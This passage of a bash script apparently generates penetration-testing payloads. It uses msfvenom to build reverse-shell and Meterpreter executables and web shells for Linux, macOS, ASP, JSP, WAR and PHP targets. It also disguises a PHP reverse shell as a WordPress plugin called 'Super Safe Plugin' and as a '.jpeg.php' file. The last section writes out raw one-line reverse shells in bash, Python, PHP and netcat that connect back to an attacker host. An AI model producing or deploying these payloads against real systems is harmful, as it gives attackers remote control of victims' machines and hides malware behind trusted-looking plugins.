  if [[ $OS = "all" ]] || [[ $OS = "lin" ]]
  then
    if [[ -d "./Linux" ]]
    then
      echo "" > /dev/null
    else
    mkdir ./Linux
  fi
    if [[ $Arch = "all" ]] || [[ $Arch = "x86" ]]
    then
      if [[ -d "./Linux/x86" ]]
      then
        border "Linux x86 Exists"
        echo "Skipping payload generation for Linux x86"
      else
      mkdir ./Linux/x86
      border "Linux X86 Payloads" >> readme.md
      msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x86/shell_reverse_tcp_$Port.elf && echo "shell_reverse_tcp (elf)   /Linux/x86/shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x86/staged_shell_reverse_tcp_$Port.elf && echo "staged_Shell_reverse_tcp (elf)   /Linux/x86/staged_shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x86/meterpreter_reverse_tcp_$Port.elf && echo "meterpreter_reverse_tcp (elf)   /Linux/x86/shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x86/staged_meterpreter_reverse_tcp_$Port.elf && echo "staged_meterpreter_reverse_tcp (elf)   /Linux/x86/staged_shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    fi
    else
      echo "" > /dev/null
    fi

  if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]]
  then
    if [[ -d "./Linux/x64" ]]
    then
      border "Linux x64 Exists"
      echo "Skipping payload generation for Linux x64"
    else
    mkdir ./Linux/x64
    border "Linux X64 Payloads" >> readme.md
    msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x64/shell_reverse_tcp_$Port.elf && echo "shell_Reverse_TCP (elf)   /Linux/x64/shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x64/staged_shell_reverse_tcp_$Port.elf && echo "staged_Shell_Reverse_TCP (elf)   /Linux/x64/staged_shell_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x64/meterpreter_reverse_tcp_$Port.elf && echo "meterpreter_Reverse_TCP (elf)   /Linux/x64/meterpreter_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/meterpreter_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f elf > ./Linux/x64/staged_meterpreter_reverse_tcp_$Port.elf && echo "staged_meterpreter_Reverse_TCP (elf)   /Linux/x64/staged_meterpreter_reverse_tcp_$Port.elf" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
  fi
  else
    echo "" > /dev/null
  fi

  else
    echo "" > /dev/null
  fi



  if [[ $OS = "all" ]] || [[ $OS = "mac" ]]
  then
    if [[ -d "./Mac" ]]
    then
      echo "" > /dev/null
    else
    mkdir ./Mac
  fi
    if [[ $Arch = "all" ]] || [[ $Arch = "x86" ]]
    then
      if [[ -d "./Mac/x86" ]]
      then
        border "Mac x86 Exists"
        echo "Skipping payload generation for Mac x86"
      else
      mkdir ./Mac/x86
      border "Mac X86 Payloads" >> readme.md
      msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$Port -f macho > ./Mac/x86/shell_reverse_tcp_$Port.macho && echo "shell_reverse_tcp (macho)   /Mac/x86/shell_reverse_tcp_$Port.macho" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload osx/x86/shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    fi
    else
      echo "" > /dev/null
    fi

  if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]]
  then
    if [[ -d "./Mac/x64" ]]
    then
      border "Mac x64 Exists"
      echo "Skipping payload generation for Mac x64"
    else
    mkdir ./Mac/x64
    border "Mac X64 Payloads" >> readme.md
    msfvenom -a x64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=$IP LPORT=$Port -f macho > ./Mac/x64/shell_reverse_tcp_$Port.macho && echo "shell_Reverse_TCP (macho)   /Mac/x64/shell_reverse_tcp_$Port.macho" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload osx/x64/shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a x64 --platform osx -p osx/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$Port -f macho > ./Mac/x64/meterpreter_reverse_tcp_$Port.macho && echo "meterpreter_Reverse_TCP (macho)   /Mac/x64/meterpreter_reverse_tcp_$Port.macho" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload osx/x64/meterpreter_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a x64 --platform osx -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f macho > ./Mac/x64/staged_meterpreter_reverse_tcp_$Port.macho && echo "staged_meterpreter_Reverse_TCP (macho)   /Mac/x64/staged_meterpreter_reverse_tcp_$Port.macho" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload osx/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
  fi
  else
    echo "" > /dev/null
  fi

  else
    echo "" > /dev/null
  fi





  if [[ $OS = "all" ]] || [[ $OS = "web" ]]
  then
    if [[ -d "./Web" ]]
    then
      border "Web Exists"
      echo "Skipping payload generation for Web"
    else
    mkdir ./Web
    border "Web Payloads (Non Meterpreter)" >> readme.md
    mkdir ./Web/Meterpreter && mkdir ./Web/NonMeterpreter
    #Non Meterpreter Payloads
	  msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f asp > ./Web/NonMeterpreter/shell_reverse_tcp_$Port.asp && echo "shell_Reverse_TCP (asp)   /Web/NonMeterpreter/shell_reverse_tcp_$Port.asp" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$Port -f raw > ./Web/NonMeterpreter/shell_reverse_tcp_$Port.jsp && echo "shell_Reverse_TCP (JSP)   /Web/NonMeterpreter/shell_reverse_tcp_$Port.jsp" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$Port -f war > ./Web/NonMeterpreter/shell_reverse_tcp_$Port.war && echo "shell_Reverse_TCP (WAR)   /Web/NonMeterpreter/shell_reverse_tcp_$Port.war" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a php --platform php -p php/reverse_php LHOST=$IP LPORT=$Port -f raw > ./Web/NonMeterpreter/shell_reverse_tcp_$Port.php && echo "shell_Reverse_TCP (PHP)   /Web/NonMeterpreter/shell_reverse_tcp_$Port.php" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload php/reverse_php;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    #Pentest Monkey Reverse Shell
    git clone https://github.com/pentestmonkey/php-reverse-shell.git #Thank You to Pentest Monkey for this PHP reverse Shell
    #Set up and copy base PHP Reverse Shell and Jpeg
    cp ./php-reverse-shell/php-reverse-shell.php ./php_reverse_shell.php
    sed -i "s/127.0.0.1/$IP/" ./php_reverse_shell.php
    sed -i "s/1234/$Port/" ./php_reverse_shell.php
    cp ./php_reverse_shell.php ./Web/NonMeterpreter/nc_php_reverse_shell_$Port.php && echo "nc_php_reverse_shell (PHP)  /Web/NonMeterpreter/nc_php_reverse_shell_$Port.php" >> readme.md && echo "nc -lnvp $Port" >> readme.md && echo "" >> readme.md
    cp ./php_reverse_shell.php ./Web/NonMeterpreter/nc_php_reverse_shell_$Port.jpeg.php && echo "nc_php_reverse_shell_jpeg (PHP)  /Web/NonMeterpreter/nc_php_reverse_shell_$Port.jpeg.php" >> readme.md && echo "nc -lnvp $Port" >> readme.md && echo "" >> readme.md
    #Wordpress Plugin
    sed -i 's:<?php:*/:' ./php_reverse_shell.php
    echo "<?php" > ./wpshell.php
    echo "/*" >> ./wpshell.php
    echo "Plugin Name:  Super Safe Plugin" >> ./wpshell.php
    echo "Plugin URI: http://mindyour.biz" >> ./wpshell.php
    echo "Description: This is super not suspicious" >> ./wpshell.php
    echo "Version: 1.0" >> ./wpshell.php
    echo "Author: Trustworthy Person" >> ./wpshell.php
    echo "Author URI: http://trust.me" >> ./wpshell.php
    echo "Text Domain: shell" >> ./wpshell.php
    echo "Domain Path: /languages" >> ./wpshell.php
    less ./php_reverse_shell.php >> ./wpshell.php
    zip wpshellphp.zip ./wpshell.php
    mv ./wpshell.php ./Web/NonMeterpreter/wpshell_$Port.php && echo "Wordpress PHP Reverse Shell (NC)   /Web/NonMeterpreter/wpshell_$Port.php" >> readme.md && echo "nc -lnvp $Port" >> readme.md && echo "" >> readme.md
    mv ./wpshellphp.zip ./Web/NonMeterpreter/wpshellphp_$Port.zip && echo "Wordpress Zipped PHP Reverse Shell   /Web/NonMeterpreter/wpshellphp_$Port.zip" >> readme.md && echo "nc -lnvp $Port" >> readme.md && echo "" >> readme.md
    rm ./php_reverse_shell.php
    #Meterpreter Payloads
    border "Web Payloads (Meterpreter)" >> readme.md
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f asp > ./Web/Meterpreter/Meterpreter_reverse_tcp_$Port.asp && echo "Meterpreter_Reverse_TCP (ASP)   /Web/Meterpreter/Meterpreter_reverse_tcp_$Port.asp" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
    msfvenom -a php --platform php -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$Port -f raw > ./Web/Meterpreter/Meterpreter_Reverse_tcp_$Port.php && echo "Meterpreter_Reverse_TCP (PHP)   /Web/Meterpreter/Meterpreter_reverse_tcp_$Port.php" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
  fi
  else
    echo "" > /dev/null
  fi

  if [[ $OS = "all" ]] || [[ $OS = "raw" ]]
  then
    if [[ -w "./raw.md" ]]
    then
      border "Raw Exists"
      echo "Skipping payload generation for Raw"
    else
    border "Raw Payloads" >> readme.md
    echo "In the Venom Directory see the raw.md file for these payloads" >> readme.md
    echo "These are not used with Metasploit but can be used with netcat" >> readme.md
    echo "" >> readme.md
    border "Listener" >> raw.md
    echo "Listener:  nc -lnvp $Port" >> raw.md
    border "RAW Payloads" >> raw.md
    echo "These can be used with the command 'nc -lnvp <PORT>' " >> raw.md && echo "" >> raw.md
    echo "Bash" > raw.md && echo "bash -i >& /dev/tcp/$IP/$Port 0>&1" >> raw.md && echo "" >> raw.md
    echo "Python" >> raw.md && echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" >> raw.md && echo "" >> raw.md
    echo "PHP" >> raw.md && echo "php -r '\$sock=fsockopen("$IP",$Port);exec("/bin/sh -i '<&3' '>&3' '2>&3'");'" >> raw.md && echo "" >> raw.md
    echo "Netcat" >> raw.md && echo "nc -e /bin/sh $IP $Port" >> raw.md && echo "" >> raw.md
  fi




  else
    echo "" > /dev/null
  fi




fi

#Confirmation Message
border "Payload Generation Complete"


exit 0
